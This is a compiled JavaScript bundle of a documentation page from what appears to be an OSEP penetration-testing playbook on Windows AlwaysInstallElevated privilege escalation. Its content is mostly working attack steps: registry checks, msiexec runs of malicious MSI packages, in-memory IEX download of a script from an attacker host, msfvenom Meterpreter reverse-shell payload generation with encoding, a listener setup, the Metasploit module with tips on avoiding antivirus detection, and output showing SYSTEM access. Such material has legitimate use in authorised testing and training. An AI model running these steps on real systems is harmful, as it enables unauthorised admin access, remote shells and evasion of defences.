"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[5717],{1193(e,n,s){s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>a,default:()=>h,frontMatter:()=>r,metadata:()=>l,toc:()=>c});const l=JSON.parse('{"id":"osep/Privilege Escalation/AlwaysInstallElevated","title":"AlwaysInstallElevated","description":"AlwaysInstallElevated","source":"@site/docs/osep/Privilege Escalation/AlwaysInstallElevated.md","sourceDirName":"osep/Privilege Escalation","slug":"/osep/Privilege Escalation/AlwaysInstallElevated","permalink":"/OSEP-Playbook/docs/osep/Privilege Escalation/AlwaysInstallElevated","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Access Tokens - SeImpersonate","permalink":"/OSEP-Playbook/docs/osep/Privilege Escalation/Access Tokens - SeImpersonate"},"next":{"title":"Enumeration","permalink":"/OSEP-Playbook/docs/osep/Privilege Escalation/Enumeration"}}');var t=s(4848),i=s(8453);const r={},a=void 0,o={},c=[{value:"<strong>AlwaysInstallElevated</strong>",id:"alwaysinstallelevated",level:3},{value:"<strong>Check if Vulnerable</strong>",id:"check-if-vulnerable",level:3},{value:"<strong>Exploit - NewLocalAdmin</strong>",id:"exploit---newlocaladmin",level:3},{value:"<strong>Exploit - Reverse Shell</strong>",id:"exploit---reverse-shell",level:3},{value:"<strong>Exploit - Meterpreter Built In Module</strong>",id:"exploit---meterpreter-built-in-module",level:3}];function d(e){const n={a:"a",code:"code",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h3,{id:"alwaysinstallelevated",children:(0,t.jsx)(n.strong,{children:"AlwaysInstallElevated"})}),"\n",(0,t.jsx)(n.h3,{id:"check-if-vulnerable",children:(0,t.jsx)(n.strong,{children:"Check if Vulnerable"})}),"\n",(0,t.jsxs)(n.p,{children:["If both the\xa0",(0,t.jsx)(n.strong,{children:"HKLM"}),"\xa0(",(0,t.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE"}),") and\xa0",(0,t.jsx)(n.strong,{children:"HKCU"}),"\xa0(",(0,t.jsx)(n.code,{children:"HKEY_CURRENT_USER"}),") hives have the\xa0",(0,t.jsx)(n.strong,{children:"AlwaysInstallElevated"}),"\xa0key set to\xa0",(0,t.jsx)(n.code,{children:"1"}),", an attacker can create and execute a malicious MSI package with system-level privileges, bypassing normal user restrictions."]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"How to Check for the Vulnerability"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"# Check in HKEY_LOCAL_MACHINE for system-wide policy\nreg query HKLM\\software\\policies\\microsoft\\windows\\installer /v alwaysinstallelevated\nor\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\n\n# Check in HKEY_CURRENT_USER for user-specific policy\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nor\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\n\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Interpreting the Results"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["If both registry keys return a value of\xa0",(0,t.jsx)(n.code,{children:"1"}),", it means\xa0",(0,t.jsx)(n.strong,{children:"AlwaysInstallElevated"}),"\xa0is enabled, and the system is vulnerable to this escalation technique."]}),"\n",(0,t.jsxs)(n.li,{children:["If one or both keys return an error or a value other than\xa0",(0,t.jsx)(n.code,{children:"1"}),", the vulnerability is not present."]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"exploit---newlocaladmin",children:(0,t.jsx)(n.strong,{children:"Exploit - NewLocalAdmin"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsxs)(n.strong,{children:["Upload the\xa0",(0,t.jsx)(n.code,{children:"newlocaladmin.msi"})]}),"\xa0to the victim."]}),"\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Execute it"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"msiexec /quiet /qn /i newlocaladmin.msi\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsxs)(n.strong,{children:["Upload the script\xa0",(0,t.jsx)(n.code,{children:"Invoke-RunasCs.ps1"})]}),"\xa0to the victim"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"# Directly load it in memory\nIEX (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]/Invoke-RunasCs.ps1')\n\n# Normal download, be careful for AV Detection, consider placing it in the /Temp or /Tasks folders\niwr -uri http://[ATTACKER_IP]/Invoke-RunasCs.ps1 -Outfile Invoke-RunasCs.ps1\nImport-Module ./Invoke-RunasCs.ps1\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Get Code Execution"}),"\xa0with the newly created user"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"Invoke-RunasCs amit 'Password123!' 'whoami /priv' -ForceProfile -CreateProcessFunction 2 -BypassUac\n\n"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://github.com/Extravenger/OSEPlayground/tree/main/06%20-%20Privilege%20Escalation/AlwaysInstallElevated",children:"GitHub Reference"})}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"exploit---reverse-shell",children:(0,t.jsx)(n.strong,{children:"Exploit - Reverse Shell"})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"Steps"}),"\xa0If both keys are set to\xa0",(0,t.jsx)(n.code,{children:"1"}),", you can create a malicious MSI package to escalate privileges:"]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Generate a malicious MSI"}),": this payload could open a reverse shell, create a new administrative user, or perform another privileged action."]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"windows/x64/meterpreter/reverse_https\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=[PORT] -f msi -o malicious.msi\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Setup a Listener"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Execute the MSI"}),": as a low-privileged user, execute the MSI package using the Windows Installer (",(0,t.jsx)(n.code,{children:"msiexec"}),"), and it will run with elevated privileges."]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# If the payload is a reverse shell, it could maybe work by just executing the .msi, try it; otherwise just use below steps\n./malicious.msi\n\n# This will install and execute the malicious MSI with system-level permissions, allowing you to escalate your privileges.\nmsiexec /quiet /qn /i malicious.msi\n\n# The /quiet and /qn flags ensure that the installation runs silently without user interaction\n# The /i flag specifies that you're installing the MSI package.\n\n"})}),"\n",(0,t.jsx)(n.h3,{id:"exploit---meterpreter-built-in-module",children:(0,t.jsx)(n.strong,{children:"Exploit - Meterpreter Built In Module"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"You need to already have a Meterpreter session for the victim"}),"\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Load the module"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"msf6 exploit(multi/handler) > use exploit/windows/local/always_install_elevated\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Set the Options"}),", it is important to change the default options or we will be flagged by the AV"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"msf6 exploit(windows/local/always_install_elevated) > set VERBOSE true\nmsf6 exploit(windows/local/always_install_elevated) > set payload windows/exec\nmsf6 exploit(windows/local/always_install_elevated) > set session [SESSION_ID]\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Encode and run your command"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# Option 1 - We can first try with encoded Powershell command, here 'whoami > C:\\whoami.txt'\nmsf6 exploit(windows/local/always_install_elevated) > set cmd 'powershell -enc dwBoAG8AYQBtAGkAIAA+ACAAQwA6AFwAdwBoAG8AYQBtAGkALgB0AHgAdAA='\n\nmsf6 exploit(windows/local/always_install_elevated) > run\n[*] Uploading the MSI to C:\\Users\\user\\AppData\\Local\\Temp\\uDBjvv.msi ...\n[*] Executing MSI...\n[*] Exploit completed, but no session was created.\nmsf6 exploit(windows/local/always_install_elevated) > sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter > cat C:/whoami.txt\nnt authority\\system\n\n# Option 2 - Run a Meterpreter reverse shell program\nmsf6 exploit(windows/local/always_install_elevated) > set cmd 'C:\\met.exe'\nmsf6 exploit(windows/local/always_install_elevated) > run\n\n[*] Uploading the MSI to C:\\Users\\user\\AppData\\Local\\Temp\\uBnecgivVWuR.msi ...\n[*] Executing MSI...\n[*] Sending stage (175174 bytes) to 192.168.X.Y\n[*] Meterpreter session 2 opened (192.168.X.Y:443 -> 192.168.Z.Z:49798 ) at 2022-06-03 21:29:45 +0200\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"(Optional)"}),"\xa0We can also try the following payload and see if it works"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# Create the payload\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=443 -e x64/xor_dynamic -i 3 -f msi -o met.msi\n\n# Start an HTTP Server\n\n# Execute it\nmsiexec /q /i http://[ATTACKER_IP]/met.msi\n\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453(e,n,s){s.d(n,{R:()=>r,x:()=>a});var l=s(6540);const t={},i=l.createContext(t);function r(e){const n=l.useContext(i);return l.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),l.createElement(i.Provider,{value:n},e.children)}}}]);